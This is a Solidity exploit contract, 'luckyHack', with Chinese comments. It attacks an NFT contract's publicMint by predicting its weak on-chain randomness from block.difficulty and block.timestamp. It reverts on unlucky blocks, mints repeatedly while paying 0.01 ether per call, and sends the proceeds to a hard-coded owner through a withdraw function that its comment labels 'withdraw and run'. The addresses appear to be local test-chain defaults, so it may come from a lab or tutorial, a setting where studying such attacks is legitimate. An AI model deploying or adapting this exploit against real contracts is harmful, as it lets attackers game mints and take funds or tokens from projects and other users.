// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.13;

contract luckyHack  {

   event Log(string);

   address owner      = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
   address nftAddress = 0x5FbDB2315678afecb367f032d93F642f64180aa3;   
   
   //向合约内注入资金，用于mint NFT
   function sendEther() public payable{
   } 

   //查询当前区块参数是否符合中奖条件
   function getRandom() public view returns(uint){
        if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {
            return 0;
        }else{
            return 1;
        }
   }

   // 调用 _safemint() 必须实现的方法接口
   function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
    return this.onERC721Received.selector;
   }

   //发动攻击的函数
   function hack(uint256 amount) public { 

        //如果当前区块参数不符合中奖条件，则终止操作
        if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {
           revert("Not lucky");
         }
        //使用abi.encodeWithSignature() 来获取所需格式的 calldata
        bytes memory data = abi.encodeWithSignature("publicMint()");
        for(uint i=0; i<amount ; ++i){
            //如果合约内金额小于等于 0.01 eth,则停止攻击
            if (address(nftAddress).balance <= 0.01 ether) {
                emit Log("rug away!");
                return;
            }
           //使用 call() 来发送 data 
           (bool status,) = address(nftAddress).call{value:0.01 ether}(data);          
            if( !status ){
            revert("error");
         }else{
            emit Log("success");
         }
        } 
   }

   function getBalance() external view returns(uint256) {
      return address(this).balance;
    }

   receive() external payable {}

   //提款跑路
   function withdraw() public  {
      require(payable(owner).send(address(this).balance));
    } 
}